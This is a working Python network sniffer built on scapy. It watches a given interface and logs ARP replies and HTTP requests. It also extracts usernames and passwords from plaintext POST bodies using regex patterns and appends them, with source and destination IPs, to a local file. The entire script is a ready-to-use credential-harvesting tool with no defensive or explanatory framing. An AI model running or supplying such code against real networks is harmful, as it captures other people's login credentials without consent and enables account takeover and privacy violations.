#!/usr/bin/env python3

import os
import scapy.all as scapy
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
import argparse
import re

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="specify your interface to sniff data ex:eth0,wlan0,wlan1")
    return parser.parse_args()

# Function to write data to a file
def write_to_file(data):
    try:
        file_path = os.path.join(os.getcwd(), "captured_data.txt")
        with open(file_path, "a") as f:
            f.write(data + "\n")
        print(f"Data successfully written to file: {file_path}")
    except Exception as e:
        print("Error writing to file:", e)

def sniffed_data(packet):
    try:
        if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
            arp_data = f"ARP Packet: {packet.summary()}"
            print(arp_data)
            write_to_file(arp_data)

        # Check if the packet has an HTTP layer
        if packet.haslayer(HTTPRequest):
            http_layer = packet[HTTPRequest]
            # Get the HTTP method
            method = http_layer.Method.decode()
            # Get the source and destination IP address
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            # Get the requested URL
            host = http_layer.Host.decode() if http_layer.Host else ''
            path = http_layer.Path.decode() if http_layer.Path else ''
            full_url = f"http://{host}{path}"
            http_info = f"HTTP {method} Request from {src_ip} to {dst_ip}: {full_url}"
            print(http_info)
            write_to_file(http_info)
            # Check if it's a POST request
            if method == "POST":
                # Get the POST data (payload)
                if packet.haslayer(scapy.Raw):
                    payload = packet[scapy.Raw].load.decode('utf-8', errors='replace')
                    # Debugging output
                    post_data = f"POST Request from {src_ip} to {dst_ip} with payload: {payload}"
                    print(post_data)
                    write_to_file(post_data)

                    # Search for username parameter in payload
                    username_match = re.search(r'(user(?:name)?|userlogin|username_login|login_username)=(.*?)(&|$)', payload, re.IGNORECASE)
                    # Search for password parameter in payload
                    password_match = re.search(r'(pass(?:word)?|password_login|login_password)=(.*?)(&|$)', payload, re.IGNORECASE)
                    # Check if both username and password parameters were found
                    if username_match and password_match:
                        # Extract username from the second capturing group of username_match
                        username = username_match.group(2)
                        # Extract password from the second capturing group of password_match
                        password = password_match.group(2)
                        # Log the captured credentials
                        credentials_data = f"Login attempt: username='{username}', password='{password}' from {src_ip} to {dst_ip}"
                        print(credentials_data)
                        write_to_file(credentials_data)
    except Exception as e:
        print(f"Error processing packet: {e}")

args = get_arguments()

if args.interface:
    # Start sniffing on the specified interface
    scapy.sniff(iface=args.interface, store=False, prn=sniffed_data)
else:
    print("[-] specify interface to sniff please!!")
